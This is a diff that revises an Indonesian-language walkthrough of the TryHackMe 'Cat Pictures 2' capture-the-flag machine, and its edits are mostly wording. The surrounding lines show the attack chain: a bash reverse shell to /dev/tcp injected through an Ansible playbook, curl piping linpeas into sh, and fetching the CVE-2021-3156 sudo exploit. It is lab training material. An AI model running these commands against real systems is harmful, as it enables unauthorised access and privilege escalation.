@@ -3,7 +3,11 @@
 - IP Machine: 10.10.154.180
 
 ## Nmap Report
-- Baris perintah: `nmap -sV -sC -A <IP Machine>`
+- Lakukan port scanning dengan tool `nmap`
+```sh
+nmap -sV -sC -A <IP Machine>
+```
+- Berikut adalah hasil port scanning
 ```sh
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV -sC -A 10.10.154.180
@@ -135,14 +139,14 @@ wget http://<IP_machine>/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%206.JPG)
 
-- Gunakan `exiftool` untuk memeriksanya
+- Gunakan `exiftool` untuk memeriksanya informasi gambar tersebut
 ```sh
 exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg 
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%207.JPG)
 
-- Sekarang kita buka url `http://IP_machine:8080/764efa883dda1e11db47671c4a3bbd9e.txt` di browser. Disini terdapat informasi username dan password untuk mengakses gitea dan terdapat halaman ansible yang berada di port 1337
+- Ditemukan informasi direktori web `:8080/764efa883dda1e11db47671c4a3bbd9e.txt`. Sekarang kita buka URL `http://IP_machine:8080/764efa883dda1e11db47671c4a3bbd9e.txt` di browser. Disini terdapat informasi username dan password untuk mengakses gitea yang berjalan di port 3000 dan terdapat halaman ansible yang berada di port 1337
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%208.JPG)
 
@@ -151,7 +155,7 @@ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%209.JPG)
 
-- Login dengan username dan password yang sudah tersedia
+- Login dengan username dan password yang ditemukan diatas
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2010.JPG)
 
@@ -171,11 +175,11 @@ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2014.JPG)
 
-- Jika kita lihat isi file **playbook.yaml** berisi command **whoami**
+- Jika kita lihat isi file **playbook.yaml** yang berada di gitea, file tersebut berisi command **whoami**
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2015.JPG)
 
-- Klik menu **Run Ansible Playbook** kemudian tunggu hingga proses eksekusi selesai. Setelah itu pindah ke tab **Logs** maka di keterangan **stdout** tertulis **bismuth** yang merupakan nama user saat ini
+- Klik menu **Run Ansible Playbook** pada halaman ansible kemudian tunggu hingga proses eksekusi selesai. Setelah itu pindah ke tab **Logs** maka di keterangan **stdout** tertulis **bismuth** yang merupakan nama user saat ini
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2016.JPG)
 
@@ -198,11 +202,11 @@ bash -c "bash -i >& /dev/tcp/IP_tun0/9000 0>&1"
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2019.JPG)
 
-- Isi keterangan commit dengan "Update" lalu tekan tombol Commit Changes untuk menyimpan perubahan
+- Isi keterangan commit dengan "Update" lalu tekan tombol **Commit Changes** untuk menyimpan perubahan
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2020.JPG)
 
-- Klik menu **Run Ansible Playbook** untuk menjalankan
+- Klik menu **Run Ansible Playbook** di halaman ansible untuk menjalankan
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2021.jpg)
 
@@ -226,7 +230,7 @@ python3 -m http.server 80
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2024.JPG)
 
-- Download dan eksekusi file tersebut dengan curl di server
+- Download dan eksekusi file tersebut dengan tool `curl` di server
 ```sh
 curl -L http://IP_tun0/linpeas.sh | sh
 ```
@@ -245,7 +249,7 @@ git clone https://github.com/blasty/CVE-2021-3156.git
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2027.JPG)
 
-- Zip file tersebut dengan tar
+- Zip file tersebut dengan `tar`
 ```sh
 tar -cvf exploit.tar CVE-2021-3156
 ```
@@ -259,7 +263,7 @@ python3 -m http.server 80
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2029.JPG)
 
-- Download dan ekstrak zip tersebut ke server
+- Download zip tersebut ke server dan lakukan ekstrak
 ```sh
 cd /tmp
 wget http://IP_tun0/exploit.tar
